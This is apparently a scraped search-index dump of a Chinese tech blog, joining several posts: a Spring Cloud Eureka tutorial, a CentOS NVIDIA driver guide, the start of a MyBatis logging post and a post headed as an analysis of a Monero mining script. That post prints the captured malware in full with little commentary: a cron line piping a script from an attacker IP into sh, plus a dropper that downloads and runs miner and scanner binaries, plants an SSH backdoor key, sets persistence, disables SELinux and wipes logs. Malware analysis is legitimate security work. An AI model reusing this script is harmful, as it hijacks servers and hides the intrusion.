&lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Client 的启动主类，添加注解 @EnableEurekaClient 12345678@EnableEurekaClient@SpringBootApplicationpublic class DeptProviderApplication { public static void main(String[] args){ SpringApplication.run(DeptProviderApplication.class, args); }} 添加 Eureka Client 需要的 application.yml 配置文件到工程的 src/main/resources 目录下，特别注意：在生产环境（外网）部署 Eureka Server，一定要配置 eureka:instance:prefer-ip-address: true 参数，否则服务消费者无法通过正确的 IP 调用服务提供者的接口 1234567891011121314server: port: 9090spring: application: name: demo-client #需要指定spring.application.name，否则会在 Eureka Server 界面显示为 UNKNOWeureka: client: service-url: defaultZone: http://localhost:7001/eureka instance: instance-id: demo-client-9090 #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名 5. 完善注册服务的 info 信息Maven 父级 Pom 工程添加以下配置： 1234567891011121314151617181920&lt;build&gt; &lt;finalName&gt;springcloud-demo&lt;/finalName&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;delimiters&gt; &lt;delimit&gt;$&lt;/delimit&gt; &lt;/delimiters&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 配置 Eureka Client 工程里的 pom.xml 文件，引入 spring-boot-starter-actuator 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 配置 Eureka Client 工程里的 application.yml 文件，添加以下内容；若 Info 界面不能正确显示 $ 符号替换后的服务信息，可以尝试依次执行 mvn clean 、mvn compile、 mvn install 命令 12345info: app.name: springcloud-demo company.name: www.example.com build.version: $project.version$ build.artifactId: $project.artifactId$ 6. 测试分别启动 eureka-server 及 eureka-client 应用，然后通过浏览器访问 http://127.0.0.1:7001，若正常显示 Eureka Server 的管理界面和服务列表（如下图），则说明一切配置成功。 Eureka 进阶实战Eureka 的服务事件监听Eureka 提供了五种服务监听事件，因为在某些业务场景下，可能需要做一些自定义的扩展；例如某个微服务挂掉了，希望能监听到并给管理员发送邮件通知等。 EurekaServerStartedEvent: Eureka 注册中心启动事件 EurekaRegistryAvailableEvent: Eureka 注册中心可用事件 EurekaInstanceRenewedEvent: 服务实例续约事件 EurekaInstanceCanceledEvent: 服务实例下线事件 EurekaInstanceRegisteredEvent: 服务实例注册事件 Eureka 的 REST APIEureka 提供了 REST API，允许非 Java 语言的其他应用服务通过 HTTP REST 的方式接入 Eureka 的服务发现中，API 列表可参考 Eureka 官方文档的介绍或者下图。 Eureka 开启登录认证配置 Eureka Server 工程里的 pom.xml 文件，引入 spring-cloud-starter-security 依赖 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; 配置 Eureka Server 工程里的 application.yml 文件，增加用户名、密码的配置 123456security: basic: enabled: true user: name: admin #Eureka的登录用户名 password: 123456 #Eureka的登录密码 在 Eureka Server 工程里加入 Security 配置类，关闭掉 CSRF，否则 Client 无法连接 Eureka Server 端；若项目中引入了 Actuator，那么还需要放行 Actuator 的请求 12345678910111213@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable() .authorizeRequests() .antMatchers("/eureka/**").permitAll() .antMatchers("/actuator/**").permitAll() .anyRequest().authenticated().and().httpBasic(); }} 配置 Eureka Client 工程里的 application.yml 文件，更改注册中心的地址 1234567891011121314server: port: 9090spring: application: name: demo-clienteureka: client: service-url: defaultZone: http://admin:123456@localhost:7001/eureka instance: instance-id: demo-client-9090 prefer-ip-address: true 分别启动 eureka-server 及 eureka-client 应用，然后通过浏览器访问 http://127.0.0.1:7001，此时会先弹出登录框，输入正确的用户名和密码后才能看到管理页面 Eureka 集群配置假设现有三台 Eureka Server 主机，每台主机的 IP 与端口分别是： 192.168.1.105:8005、192.168.1.106:8006、192.168.1.107:8007 Eureka Server1 配置1234567891011server: port: 8005eureka: instance: hostname: 192.168.1.105 client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://192.168.1.106:8006/eureka/,http://192.168.1.107:8007/eureka/ Eureka Server2 配置1234567891011server: port: 8006eureka: instance: hostname: 192.168.1.106 client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://192.168.1.105:8005/eureka/,http://192.168.1.107:8007/eureka/ Eureka Server3 配置1234567891011server: port: 8007eureka: instance: hostname: 192.168.1.107 client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://192.168.1.105:8005/eureka/,http://192.168.1.106:8006/eureka/ Eureka Client 集群配置1234567891011121314server: port: 9090spring: application: name: demo-clienteureka: client: service-url: defaultZone: http://192.168.1.105:8005/eureka/,http://192.168.1.106:8006/eureka/,http://192.168.1.107:8007/eureka/ instance: instance-id: demo-client-9090 prefer-ip-address: true 启动三台 Eureka Server，分别访问三台 Eureka Server 的管理界面，若界面上的 DS Replicas 项可以正常显示其他 Eureka Server 节点（如下图），则说明 Eureka 服务器集群配置成功 本地集群搭建的细节说明若三台 Eureka Server 的 IP 都是 127.0.0.1 或者 localhost，彼此只是服务端口不一样；此时建议修改系统的 hosts 文件作相应的域名映射，方便日后访问 Eureka 的服务。当 hosts 文件加入下述配置之后，则可以通过不同的域名访问对应的 Eureka 服务了，如：http://eureka8005.com:8005/eureka/ 123127.0.0.1 eureka8005.com127.0.0.1 eureka8006.com127.0.0.1 eureka8007.com 特别注意：新版的 Eureka 搭建集群时，eureka.client.serviceUrl.defaultZone 配置项的地址，不能使用 localhost 或者内网/外网 IP，必须使用域名，DNS 解析需自行配置，也可以在本机的 /etc/hosts 里映射域名，否则各节点均出现在 unavailable-replicas 下 补充内容CAP 理论CAP 理论的核心是：一个分布式系统不可能同时很好地满足一致性、可用性和分区容错性这三个需求。因此，根据 CAP 理论可以将 NoSQL 数据库分成满足 CA 原则、满足 CP 原则和满足 AP 原则三大类： CA - 单点集群，满足一致性、可用性的系统，通常在可扩展上不太强大 CP - 满足一致性，分区容错性的系统，通常性能不是特别高 AP - 满足可用性、分区容忍性的系统，通常可能对一致性要求低一点 Eureka 对比 ZooKeeper ZooKeeper 保证的是 CP，Eureka 保证的是 AP Eureka 本质上是一个工程，而 ZooKeeper 只是一个进程 ZooKeeper 有 Leader 和 Follower 角色，Eureka 各个节点是平等关系 ZooKeeper 在选举期间注册服务瘫痪，虽然服务最终会恢复，但是选举期间不可用；Eureka 只要有一实例就可以保证服务可用，但查询到的数据可能并不是最新的 ZooKeeper 采用过半数存活原则，Eureka 采用自我保护机制解决分区问题 Netflix 在 AWS 中的 Eureka 部署架构 上图（左边）描述的是 Netflix 在 AWS 中的 Eureka 部署架构，图中的 us-east-1x 指的是不同的 zone。AWS 将服务划分成不同地区（region），每个 region 中又有若干个机房（zone），结构图大致上图（右边）所示，每个 zone 都是一个 Eureka 集群，其中至少有一台 Eureka Server，用来处理 zone failure。在 Eureka 中注册的服务每隔 30s 会向服务端发送一次心跳，用来告知服务端自己是否” 存活”，这个过程就是图中的 renew；如果 renew 操作在重试几次后都没有成功，那这个服务在 90s 之内就会被踢除。需要注意的是，renew 信息和服务注册信息会在多个 zone 间同步，任何一个 zone 中的客户端都可以寻找到任意一个 zone 中注册的服务信息。 两个 @EnableXXXClient 注解的区别 Spring Cloud 提供了 @EnableDiscoveryClient 与 @EnableEurekaClient 注解，其中 @EnableDiscoveryClient 基于 spring-cloud-commons，而 @EnableEurekaClient 基于 spring-cloud-netflix Spring Cloud 的服务注册发现有多种实现（Eureka、Consul、Zookeeper 等），如果选用的注册中心是 Eureka，那么就推荐使用 @EnableEurekaClient，如果是其他的注册中心，那么推荐使用 @EnableDiscoveryClient 特别注意：@EnableEurekaClient 上包含了 @EnableDiscoveryClient，可以说 @EnableEurekaClient 拥有 @EnableDiscoveryClient 的功能，其实 @EnableEurekaClient 就是一种方便使用 Eureka 的注解而已 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Centos7 安装 Nvidia 显卡驱动",url:"/posts/3a164cac.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 检查显卡的识别状况 在执行下述所有步骤之前，必须确保当前系统已经正确识别到 NVIDIA 的显卡，否则在显卡没有被正常识别的情况下，执行后续的安装步骤都是徒劳的。此时可以执行以下命令，若可以输出相关信息，则说明显卡能被系统正常识别。否则请重新插拔显卡，或者检查主板是否需要跳线或者设置 BIOS 才能正确识别独立显卡。 1# lspci | grep "NVIDIA" 安装软件依赖 1# yum -y install gcc gcc-c++ wget 安装 NVIDIA 显卡检测工具 12345678910111213# 导入key# rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org# 安装elrepo源# rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm# 安装检测工具# yum install nvidia-detect# 检测显卡，正常情况下会输出最新且适用当前显卡的驱动程序的版本号信息# nvidia-detect -v# 提示：不建议使用rpmfusion安装Nvidia的显卡驱动，因为开源的显卡驱动在性能方面跟Nvidia官方的闭源显卡驱动有一定的差距 下载 NVIDIA 驱动程序 根据显卡检测结果，在 NVIDIA 官网下载对应版本的 Linux 显卡驱动程序。 12# 下载驱动（请自行修改URL中的驱动版本号）# wget https://us.download.nvidia.cn/XFree86/Linux-x86_64/430.40/NVIDIA-Linux-x86_64-430.40.run 屏蔽系统自带的 Nouveau 显卡驱动 123456# 通过vim编辑器更改配置文件，按照以下内容进行修改# vim /lib/modprobe.d/dist-blacklist.confblacklist nouveau #添加此行options nouveau modeset=0 #添加此行# blacklist nvidiafb #将nvidiafb的这一行注释掉 重建 initramfs image 12345# 备份# mv /boot/initramfs-$(uname -r).img /boot/initramfs-$(uname -r).img.bak# 重建# dracut /boot/initramfs-$(uname -r).img $(uname -r) 重启系统 12345678910# 修改系统运行级别为纯文本模式# systemctl set-default multi-user.target# 重启系统# reboot# 系统重启完成后，在纯文本模式下使用root用户登录进系统# 查看nouveau显卡驱动是否已经被禁用，若此命令执行完之后没有输出相关信息，则说明已经被禁用# lsmod | grep nouveau (adsbygoogle = window.adsbygoogle || []).push({}); 安装 NVIDIA 显卡驱动（纯文本模式下） 12345678910111213141516171819# 文件授权# chmod +x NVIDIA-Linux-x86_64-384.59.run# 安装显卡驱动# ./NVIDIA-Linux-x86_64-384.59.run# 安装过程中，选择accept；如果提示是否编译DKMS模块，选择yes（方便以后升级系统内核）；如果提示要修改xorg.conf，选择yes；# 查看显卡驱动的安装状态，若此命令执行完之后正常输出显卡状态相关的信息，则说明Nvidia显卡驱动安装成功# nvidia-smi# 修改系统运行级别为图形模式# systemctl set-default graphical.target# 重启系统# reboot# 重启完成后，若成功进入GNOME的桌面环境，执行此命令可以调出图形界面来配置显卡（可选操作）# nvidia-settings 卸载 NVIDIA 显卡驱动（可选操作） 如果显卡驱动安装和系统重启完成后，无法正常进入 GHOME 的桌面环境，此时可以在另一台机器上通过远程 SSH 使用 root 用户登录进系统，然后手动执行以下命令卸载 NVIDIA 的显卡驱动程序（在纯文本模式下）。特别注意：当 NVIDIA 的显卡驱动被卸载后，需要启用系统自带的 Nouveau 显卡驱动 和 还原 initramfs image，否则系统会因缺少显卡驱动而无法正常显示。 1# ./NVIDIA-Linux-x86_64-430.40.run --uninstall 系统内核更新问题 如果系统更新内核并重启后，显示器无法显示 GNOME 桌面环境（一般是因为显卡驱动丢失导致显示器无法显示桌面环境，但大多数情况下 Centos 系统已经启动成功），此时可以在另一台机器上通过 SSH 远程登录进旧的 Centos 系统，然后按照上面的步骤重新安装 NVIDIA 的显卡驱动（如果安装程序提示显卡驱动已存在，手动卸载显卡驱动后，再重新安装即可）。 主板启用独立显卡 一般的桌面主板（家用）可以自动检测到独立显卡并启用，但是部分主板（例如服务器主板），则需要在 BIOS 里将板载显卡或者 CPU 的核显屏蔽掉，个别品牌可能需要通过主板跳线的方式屏蔽板载显卡或者 CPU 的核显。超微的服务器主板一般需要在 BIOS 里设置板载显卡的屏蔽，否则独立显卡无法正常识别。启用独立显卡之后，超微的部分服务器主板在系统刚启动的时候，显示器不会显示任何内容（黑屏 + 无信号输出）；因为服务器主板开机自检的耗时较长，此时一般需要耐心等待几十秒甚至更久，显示器才会显示硬件自检和系统启动相关的信息。 补充说明 一般情况下，只要 Centos 系统可以正常识别到 NVIDIA 的显卡，同时显示器与 NVIDIA 的显卡正确连接上；那么即使不安装 NVIDIA 的显卡驱动程序，在系统启动的时候，显示器都可以正常显示硬件自检和系统启动相关的信息（可能会延时显示）；唯一的问题是在系统正常启动完成后，显示器没办法显示 GNOME 桌面环境。 nvidia-smi 命令输出的信息 参考资料 关于 Centos 安装显卡驱动 Centos7.0 安装 NVIDIA 驱动 Centos7.3 安装 NVIDIA-1080TI 驱动、cuda、cudnn、TensorFlow var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"XMR 恶意挖矿脚本分析",url:"/posts/8f0349b3.html",text:'XMR 恶意挖矿脚本样本源码一 记录于 2019-07-26，攻击者将挖矿脚本的下载与执行命令写入到 Redis 服务器中，具体内容如下： 1"*/1 * * * * curl -fsSL http://185.18.105.23/E5DB0E07C3D7BE80V520/init.sh |sh" 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461#!/bin/shsetenforce 0 2&gt;dev/nullecho SELINUX=disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/nullsync &amp;&amp; echo 3 &gt;/proc/sys/vm/drop_cachescrondir=\'/var/spool/cron/\'"$USER"cont=`cat ${crondir}`ssht=`cat /root/.ssh/authorized_keys`echo 1 &gt; /etc/sysupdatesrtdir="/etc/sysupdates"bbdir="/usr/bin/curl"bbdira="/usr/bin/cur"ccdir="/usr/bin/wget"ccdira="/usr/bin/wge"mv /usr/bin/wget /usr/bin/getmv /usr/bin/xget /usr/bin/getmv /usr/bin/get /usr/bin/wgemv /usr/bin/curl /usr/bin/urlmv /usr/bin/xurl /usr/bin/urlmv /usr/bin/url /usr/bin/curminer_url="https://de.gsearch.com.de/api/sysupdate"miner_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/sysupdate"miner_size="854364"sh_url="https://de.gsearch.com.de/api/update.sh"sh_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/update.sh"config_url="https://de.gsearch.com.de/api/config.json"config_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/config.json"config_size="4954"scan_url="https://de.gsearch.com.de/api/networkservice"scan_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/networkservice"scan_size="2584072"watchdog_url="https://de.gsearch.com.de/api/sysguard"watchdog_url_backup="http://185.18.105.23/E5DB0E07C3D7BE80V520/sysguard"watchdog_size="1929480"kill_miner_proc(){ ps auxf|grep -v grep|grep "mine.moneropool.com"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "monerohash.com"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk \'{print $2}\'|xargs kill -9 ps auxf|grep -v grep|grep "xmrpool.eu" | awk \'{print $2}\'|xargs kill -9 ps auxf|grep xiaoyao| awk \'{print $2}\'|xargs kill -9 ps auxf|grep xiaoxue| awk \'{print $2}\'|xargs kill -9 ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\\-c"|xargs kill -9 ps ax|grep -o \'./[0-9]* -c\'| xargs pkill -f pkill -f biosetjenkins pkill -f Loopback pkill -f apaceha pkill -f cryptonight pkill -f stratum pkill -f mixnerdx pkill -f performedl pkill -f JnKihGjn pkill -f irqba2anc1 pkill -f irqba5xnc1 pkill -f irqbnc1 pkill -f ir29xc1 pkill -f conns pkill -f irqbalance pkill -f crypto-pool pkill -f minexmr pkill -f XJnRj pkill -f mgwsl pkill -f pythno pkill -f jweri pkill -f lx26 pkill -f NXLAi pkill -f BI5zj pkill -f askdljlqw pkill -f minerd pkill -f minergate pkill -f Guard.sh pkill -f ysaydh pkill -f bonns pkill -f donns pkill -f kxjd pkill -f Duck.sh pkill -f bonn.sh pkill -f conn.sh pkill -f kworker34 pkill -f kw.sh pkill -f pro.sh pkill -f polkitd pkill -f acpid pkill -f icb5o pkill -f nopxi pkill -f irqbalanc1 pkill -f minerd pkill -f i586 pkill -f gddr pkill -f mstxmr pkill -f ddg.2011 pkill -f wnTKYg pkill -f deamon pkill -f disk_genius pkill -f sourplum pkill -f polkitd pkill -f nanoWatch pkill -f zigw pkill -f devtool pkill -f systemctI pkill -f WmiPrwSe pkill -f sysguard pkill -f sysupdate pkill -f networkservice crontab -r rm -rf /var/spool/cron/*}downloads(){ if [ -f "/usr/bin/curl" ] then echo $1,$2 http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1` if [ "$http_code" -eq "200" ] then curl --connect-timeout 10 --retry 100 $1 &gt; $2 elif [ "$http_code" -eq "405" ] then curl --connect-timeout 10 --retry 100 $1 &gt; $2 else curl --connect-timeout 10 --retry 100 $3 &gt; $2 fi elif [ -f "/usr/bin/cur" ] then http_code = `cur -I -m 10 -o /dev/null -s -w %{http_code} $1` if [ "$http_code" -eq "200" ] then cur --connect-timeout 10 --retry 100 $1 &gt; $2 elif [ "$http_code" -eq "405" ] then cur --connect-timeout 10 --retry 100 $1 &gt; $2 else cur --connect-timeout 10 --retry 100 $3 &gt; $2 fi elif [ -f "/usr/bin/wget" ] then wget --timeout=10 --tries=100 -O $2 $1 if [ $? -ne 0 ] then wget --timeout=10 --tries=100 -O $2 $3 fi elif [ -f "/usr/bin/wge" ] then wge --timeout=10 --tries=100 -O $2 $1 if [ $? -eq 0 ] then wge --timeout=10 --tries=100 -O $2 $3 fi fi}kill_sus_proc(){ ps axf -o "pid"|while read procid do ls -l /proc/$procid/exe | grep /tmp if [ $? -ne 1 ] then cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice" if [ $? -ne 0 ] then kill -9 $procid else echo "don\'t kill" fi fi done ps axf -o "pid %cpu" | awk \'{if($2&gt;=40.0) print $1}\' | while read procid do cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice" if [ $? -ne 0 ] then kill -9 $procid else echo "don\'t kill" fi done}kill_miner_prockill_sus_procif [ -f "$rtdir" ]then echo "i am root" echo "goto 1" &gt;&gt; /etc/sysupdate chattr -i /etc/sysupdate* chattr -i /etc/config.json* chattr -i /etc/update.sh* chattr -i /root/.ssh/authorized_keys* chattr -i /etc/networkservice if [ ! -f "/usr/bin/crontab" ] then echo "*/30 * * * * sh /etc/update.sh &gt;/dev/null 2&gt;&amp;1" &gt;&gt; ${crondir} else [[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /etc/update.sh &gt;/dev/null 2&gt;&amp;1") | crontab - fi chmod 700 /root/.ssh/ echo &gt;&gt; /root/.ssh/authorized_keys chmod 600 root/.ssh/authorized_keys echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPmwqXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17" &gt;&gt; /root/.ssh/authorized_keys cfg="/etc/config.json" file="/etc/sysupdate" if [-f "/etc/config.json" ] then filesize_config=`ls -l /etc/config.json | awk \'{ print $5 }\'` if [ "$filesize_config" -ne "$config_size" ] then pkill -f sysupdate rm /etc/config.json downloads $config_url /etc/config.json $config_url_backup else echo "no need download" fi else downloads $config_url /etc/config.json $config_url_backup fi if [ -f "/etc/sysupdate" ] then filesize1=`ls -l /etc/sysupdate | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$miner_size" ] then pkill -f sysupdate rm /etc/sysupdate downloads $miner_url /etc/sysupdate $miner_url_backup else echo "not need download" fi else downloads $miner_url /etc/sysupdate $miner_url_backup fi if [ -f "/etc/sysguard" ] then filesize1=`ls -l /etc/sysguard | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$watchdog_size" ] then pkill -f sysguard rm /etc/sysguard downloads $watchdog_url /etc/sysguard $watchdog_url_backup else echo "not need download" fi else downloads $watchdog_url /etc/sysguard $watchdog_url_backup fi downloads $sh_url /etc/update.sh $sh_url_backup if [ -f "/etc/networkservice" ] then filesize2=`ls -l /etc/networkservice | awk \'{ print $5 }\'` if [ "$filesize2" -ne "$scan_size" ] then pkill -f networkservice rm /etc/networkservice downloads $scan_url /etc/networkservice $scan_url_backup else echo "not need download" fi else downloads $scan_url /etc/networkservice $scan_url_backup fi chmod 777 /etc/sysupdate ps -fe|grep sysupdate |grep -v grep if [ $? -ne 0 ] then cd /etc echo "not root runing" sleep 5s ./sysupdate &amp; else echo "root runing....." fi chmod 777 /etc/networkservice ps -fe|grep networkservice |grep -v grep if [ $? -ne 0 ] then cd /etc echo "not roots runing" sleep 5s ./networkservice &amp; else echo "roots runing....." fi chmod 777 /etc/sysguard ps -fe|grep sysguard |grep -v grep if [ $? -ne 0 ] then echo "not tmps runing" cd /etc chmod 777 sysguard sleep 5s ./sysguard &amp; else echo "roots runing....." fi chmod 777 /etc/sysupdate chattr +i /etc/sysupdate chmod 777 /etc/networkservice chattr +i /etc/networkservice chmod 777 /etc/config.json chattr +i /etc/config.json chmod 777 /etc/update.sh chattr +i /etc/update.sh chmod 777 /root/.ssh/authorized_keys chattr +i /root/.ssh/authorized_keyselse echo "goto 1" &gt; /tmp/sysupdates chattr -i /tmp/sysupdate* chattr -i /tmp/networkservice chattr -i /tmp/config.json* chattr -i /tmp/update.sh* if [ ! -f "/usr/bin/crontab" ] then echo "*/30 * * * * sh /tmp/update.sh &gt;/dev/null 2&gt;&amp;1" &gt;&gt; ${crondir} else [[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /tmp/update.sh &gt;/dev/null 2&gt;&amp;1") | crontab - fi if [ -f "/tmp/config.json" ] then filesize1=`ls -l /tmp/config.json | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$config_size" ] then pkill -f sysupdate rm /tmp/config.json downloads $config_url /tmp/config.json $config_url_backup else echo "no need download" fi else downloads $config_url /tmp/config.json $config_url_backup fi if [ -f "/tmp/sysupdate" ] then filesize1=`ls -l /tmp/sysupdate | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$miner_size" ] then pkill -f sysupdate rm /tmp/sysupdate downloads $miner_url /tmp/sysupdate $miner_url_backup else echo "no need download" fi else downloads $miner_url /tmp/sysupdate $miner_url_backup fi if [ -f "/tmp/sysguard" ] then filesize1=`ls -l /tmp/sysguard | awk \'{ print $5 }\'` if [ "$filesize1" -ne "$watchdog_size" ] then pkill -f sysguard rm /tmp/sysguard downloads $watchdog_url /tmp/sysguard $watchdog_url_backup else echo "not need download" fi else downloads $watchdog_url /tmp/sysguard $watchdog_url_backup fi echo "i am here" downloads $sh_url /tmp/update.sh $sh_url_backup if [ -f "/tmp/networkservice" ] then filesize2=`ls -l /tmp/networkservice | awk \'{ print $5 }\'` if [ "$filesize2" -ne "$scan_size" ] then pkill -f networkservice rm /tmp/networkservice downloads $scan_url /tmp/networkservice $scan_url_backup else echo "no need download" fi else downloads $scan_url /tmp/networkservice $scan_url_backup fi ps -fe|grep sysupdate |grep -v grep if [ $? -ne 0 ] then echo "not tmp runing" cd /tmp chmod 777 sysupdate sleep 5s ./sysupdate &amp; else echo "tmp runing....." fi ps -fe|grep networkservice |grep -v grep if [ $? -ne 0 ] then echo "not tmps runing" cd /tmp chmod 777 networkservice sleep 5s ./networkservice &amp; else echo "tmps runing....." fi ps -fe|grep sysguard |grep -v grep if [ $? -ne 0 ] then echo "not tmps runing" cd /tmp chmod 777 sysguard sleep 5s ./sysguard &amp; else echo "tmps runing....." fi chmod 777 /tmp/sysupdate chattr +i /tmp/sysupdate chmod 777 /tmp/networkservice chattr +i /tmp/networkservice chmod 777 /tmp/sysguard chattr +i /tmp/sysguard chmod 777 /tmp/update.sh chattr +i /tmp/update.sh chmod 777 /tmp/config.json chattr +i /tmp/config.jsonfiiptables -Fiptables -Xiptables -A OUTPUT -p tcp --dport 3333 -j DROPiptables -A OUTPUT -p tcp --dport 5555 -j DROPiptables -A OUTPUT -p tcp --dport 7777 -j DROPiptables -A OUTPUT -p tcp --dport 9999 -j DROPiptables -I INPUT -s 43.245.222.57 -j DROPservice iptables reloadps auxf|grep -v grep|grep "stratum"|awk \'{print $2}\'|xargs kill -9history -cecho &gt; /var/spool/mail/rootecho &gt; /var/log/wtmpecho &gt; /var/log/secureecho &gt; /root/.bash_history var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"网络安全 linux系统编程"},{title:"MyBatis 日志信息打印",url:"/posts/2050e9a3.html",text:'Logback 打印 MyBatis 的 SQL 以下配置只会直接打印 MyBatis 的 SQL，不会自动替换 SQL 中的 “?” 为真实参数值，如果需要打印完整的 SQL，请参考下面介绍的 P6Spy 配置教程。更多的 Logback 配置内容，可参考 SpringBoot2.0 整合 Logback。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;configuration scan="true" scanPeriod="60 seconds" debug="false"&gt; &lt;!-- 日志级别从低到高：trace &lt; debug &lt; info &lt; warn &lt; error &lt; fatal --&gt; &lt;!-- 日志上下文名称--&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;!-- 全局的日志级别，下面的所有配置只记录大于或等于此级别的日志信息（除了MyBatis） --&gt; &lt;property name="log.level" value="info"/&gt; &lt;!-- 